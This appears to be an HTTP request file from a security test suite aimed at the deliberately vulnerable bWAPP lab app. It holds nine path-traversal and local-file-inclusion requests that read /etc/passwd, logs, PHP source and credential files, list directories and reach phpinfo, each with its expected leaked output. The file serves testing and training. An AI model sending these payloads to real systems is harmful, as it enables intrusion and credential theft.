### ============================================================================
### 03 - A5 Security Misconfiguration / A4 Insecure Design:
###     Local File Inclusion, path traversal and source disclosure
###
###   directory_traversal_1.php?page=<file>  -> is_file() + fopen() + fgets()
###   directory_traversal_2.php?directory=<d> -> raw directory listing
###   Both are gated on $_COOKIE["security_level"] only, i.e. on a cookie the
###   client chooses. See 08-info-disclosure.http INFO-09.
### ============================================================================

### ---------------------------------------------------------------------------
### LFI-01  Read /etc/passwd by walking out of the webroot
###   is_file() gets an absolute-ish path after enough ../ hops, and the loop
###   echoes every line, so this is a full arbitrary file read primitive.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/directory_traversal_1.php?page=../../../../../../../etc/passwd HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, "root:x:0:0:root:/root:/bin/bash" in the output


### ---------------------------------------------------------------------------
### LFI-02  Read any absolute path - /etc/hostname (container id)
### ---------------------------------------------------------------------------
GET {{baseUrl}}/directory_traversal_1.php?page=/etc/hostname HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, the container hostname; NOT "This file doesn't exist!"


### ---------------------------------------------------------------------------
### LFI-03  Read the Apache access log (log poisoning -> RCE preimage)
###   Proves the read primitive reaches paths you did not predict, and gives a
###   foothold for the log-poisoning technique if this ever hit a real host.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/directory_traversal_1.php?page=/var/log/apache2/access.log HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, HTTP request lines, or "This file doesn't exist!" if the
###           image logs elsewhere - either result is useful recon.


### ---------------------------------------------------------------------------
### LFI-04  SOURCE CODE DISCLOSURE - read a PHP file as plain text
###   The handler uses fopen()/fgets(), never include(). That means the raw
###   source is returned instead of being executed - a .php extension does not
###   protect anything here.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/directory_traversal_1.php?page=config.inc.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, the literal text "<?php" and "$db_username" in the output


### ---------------------------------------------------------------------------
### LFI-05  SOURCE DISCLOSURE - the application's own credentials file
###   admin/settings.php holds the DB user, the static login/password pair and
###   the SMTP host in cleartext. This single request hands over the app's
###   entire secret inventory.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/directory_traversal_1.php?page=admin/settings.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, plaintext: $db_username = "root"; $login = "bee"; $password = "bug";


### ---------------------------------------------------------------------------
### LFI-06  Directory listing of an arbitrary absolute path
###   directory_traversal_2.php renders the raw listing of <directory>.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/directory_traversal_2.php?directory=/etc HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, an index of /etc including "passwd" and "shadow"


### ---------------------------------------------------------------------------
### LFI-07  Directory listing of the webroot itself
### ---------------------------------------------------------------------------
GET {{baseUrl}}/directory_traversal_2.php?directory=/var/www/html HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, full list of application files - complete source map in one request


### ---------------------------------------------------------------------------
### LFI-08  phpinfo() exposed to any authenticated user
###   Leaks PHP version, loaded modules, include_path, all environment
###   variables, and every $_ENV/$_SERVER key.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/phpinfo.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, ~80 KB of PHP configuration output


### ---------------------------------------------------------------------------
### LFI-09  RFI / SSRF entry point (informational)
###   rlfi.php and ssrf.php are hint pages: bWAPP expects the attacker to chain
###   Remote File Inclusion (or XXE) to make the SERVER issue the outbound
###   request. The reachable, working version of that is in 04-xxe-mail-upload.http
###   (XXE-02) - use this request as the map of what to attack.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/ssrf.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, describes the SSRF objective and points at the XXE payload files
